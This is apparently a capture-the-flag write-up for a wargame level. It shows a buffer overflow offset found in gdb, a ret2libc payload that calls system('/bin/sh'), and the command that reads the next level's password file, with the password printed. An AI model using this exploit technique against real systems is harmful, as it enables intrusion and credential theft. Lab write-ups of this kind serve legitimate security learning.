# level 04

## get_binary

```shell
scp -P 4242 level04@192.168.0.0:/home/users/level04/level04 level04.bin
```

## Exploit

### Segmentation fault

```shell
gdb level04
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /home/users/level04/level04 
[New process 2038]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2038]
0x41326641 in ?? ()
# offset = 156
```

### Ret to libc

```shell
# 80486c7:       c3                      ret
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc map
process 3420
Mapped address spaces:
        Start Addr  End Addr    Size        Offset  objfile
        0xf7e2c000  0xf7fcc000  0x1a0000    0x0     /lib32/libc-2.15.so

(gdb) find 0xf7e2c000, 0xf7fcf000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

```
system("/bin/sh") : ret                 + system              + "...." + "/bin/sh"
                    "0x80486c7"         + "0xf7e6aed0"        + "...." + "0xf7f897ec"
                    "\xc7\x86\x04\x08"  + "\xd0\xae\xe6\xf7"  + "...." + "\xec\x97\xf8\xf7"
```

```shell
python2.7 -c 'print(("B" * 156) +  "\xc7\x86\x04\x08"  + "\xd0\xae\xe6\xf7"  + "...." + "\xec\x97\xf8\xf7")' > /tmp/exploit.txt
chmod 777 /tmp/exploit.txt
cat /tmp/exploit.txt - | ./level4
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
